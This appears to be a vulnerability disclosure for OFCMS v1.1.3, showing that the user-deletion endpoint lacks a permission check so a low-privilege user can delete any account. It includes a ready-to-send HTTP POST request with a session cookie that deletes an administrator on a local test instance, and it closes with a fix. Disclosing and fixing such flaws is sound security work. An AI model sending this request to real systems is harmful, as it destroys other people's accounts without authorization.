## Vulnerability Description

The `SysUserController` component in OFCMS v1.1.3 contains a security vulnerability in its handling of system user deletion requests. Its `del()` method fails to rigorously validate the caller's permissions, allowing low-privilege users to access interfaces that should be restricted to administrators. A remote attacker could delete any existing user account by constructing a predictable `user_id` parameter (e.g., `1`) and sending a POST request to `/admin/system/user/del.html`.

## Vulnerability Analysis

The vulnerability's entry point class file is: \ofcms-admin\src\main\java\com\ofsoft\cms\admin\controller\system\SysUserController.java

The `del()` method on lines 68-80 does not perform any permission checks. However, the `user_id` on line 69 is controllable. Line 73 calls the `delete` method in the file `\ofcms-V1.1.3\ofcms-admin\src\main\resources\conf\sql\system\user.sql` to perform a database operation.

<img width="1469" height="856" alt="Pasted image 20260509104657" src="https://github.com/user-attachments/assets/10f6b670-6e46-4942-99a0-7079fe572735" />


sql file:\ofcms-V1.1.3\ofcms-admin\src\main\resources\conf\sql\system\user.sql

This SQL statement directly deletes the user with the username "user_id". Because "user_id" is predictable, iterable, and controllable, this statement contains a vulnerability.

<img width="1481" height="742" alt="Pasted image 20260509105019" src="https://github.com/user-attachments/assets/63b46bf5-3126-41b5-88d9-d16fa9e607d8" />


## Vulnerability Reproduction

First, log in to the administrator interface, then go to the user management module. You will see that there is currently an administrator user named cve_test, user_id=378.

<img width="1920" height="916" alt="Pasted image 20260509105137" src="https://github.com/user-attachments/assets/f7e1d5bc-171b-4114-8337-7a9b727fac7d" />



Open another browser, Firefox, and log in as the user "test" with low privileges, as shown below:

<img width="1893" height="901" alt="Pasted image 20260509105254" src="https://github.com/user-attachments/assets/1a591031-d92c-4dc0-ade5-7968a600397b" />


Based on the cookie of user 'test': JSESSIONID=4F8EAAD8C7F95B3F3C3F0B825C8446B9

<img width="1920" height="991" alt="Pasted image 20260509105354" src="https://github.com/user-attachments/assets/43ce32a4-6a66-4336-8674-4e21bcb34a2d" />


Construct the following request packet, where user_id is the ID of the user cve_test: 378

```http
POST /ofcms_admin/admin/system/user/del.html HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 9
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
sec-ch-ua-mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://127.0.0.1:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8080/ofcms_admin/admin/f.html?p=system/user/index.html
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=4F8EAAD8C7F95B3F3C3F0B825C8446B9
Connection: keep-alive

user_id=378

```

The response is as follows:

<img width="1909" height="843" alt="Pasted image 20260509105607" src="https://github.com/user-attachments/assets/83c8d851-51f3-4a60-8d66-f833d173628b" />



Returning to the administrator account, in the user management module, and refreshing, it can be seen that the administrator-privileged user cve_test was deleted by the user test with lower privileges. Since user_id is iterable and can be guessed, an arbitrary user deletion vulnerability exists in the system. The vulnerability has now been reproduced.


<img width="1920" height="872" alt="Pasted image 20260509105637" src="https://github.com/user-attachments/assets/784f7b03-6f38-47fb-86c4-65ecf0574ea9" />


## Repair suggestions


At the entry point of the `del()` method, manually add a check for the currently logged-in user's permissions. It is essential to ensure that only users with the `superuser` role or `admin` privileges can execute this deletion logic.
